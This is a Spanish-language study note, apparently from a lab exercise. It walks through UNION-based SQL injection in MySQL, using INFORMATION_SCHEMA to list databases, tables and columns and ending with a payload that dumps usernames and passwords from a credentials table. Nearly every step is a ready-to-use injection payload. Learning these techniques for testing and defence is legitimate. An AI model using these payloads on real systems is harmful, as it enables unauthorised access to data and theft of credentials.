## BBDD

#### INFORMATION_SCHEMA

Contiene los metadatos de las BBDD y tablas existentes

- Para hacer referencia a una tabla de otra BBDD:

```
SELECT * FROM BBDD.tabla;
```

De esta forma podemos mirar las tablas con el contenido de INFORMATION_SCHEMA:

- SCHEMATA: contiene informacion sobre todas las BBDD del servidor (para obtener nombres)

```
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```
![[Pasted image 20260713120601.png]]

Ahora lo usamos como payload:

```
' UNION SELECT 1,SCHEMA_NAME,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```
![[Pasted image 20260713120706.png]]


Vamos a ver que BBDD esta ejecutando la web con database() (en este caso la de ilfreight):

```
' UNION SELECT 1,database(), 3, 4 -- -
```
![[Pasted image 20260713120854.png]]


## Tablas

Para conocer el nombre de las tablas de una BBDD usaremos INFORMATION_SCHEMA.TABLES y las columnas TABLE_NAME, TABLE_SCHEMA

```
' UNION SELECT 1, TABLE_NAME, TABLE_SCHEMA, 4 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'dev'-- -
```
![[Pasted image 20260713121544.png]]

## Columnas

Para conocer las columnas que tiene la tabla volveremos a usar INFORMATION_SCHEMA.COLUMNS con los nombres de columna COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA

```
' UNION SELECT 1, COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='credentials'-- -
```
![[Pasted image 20260713121801.png]]

## Datos

Ya podemos especificar las columnas de una tabla usando los nombres de las columnas y bbdd.tabla

```
' UNION SELECT 1, USERNAME, PASSWORD, 4 FROM dev.credentials-- -
```
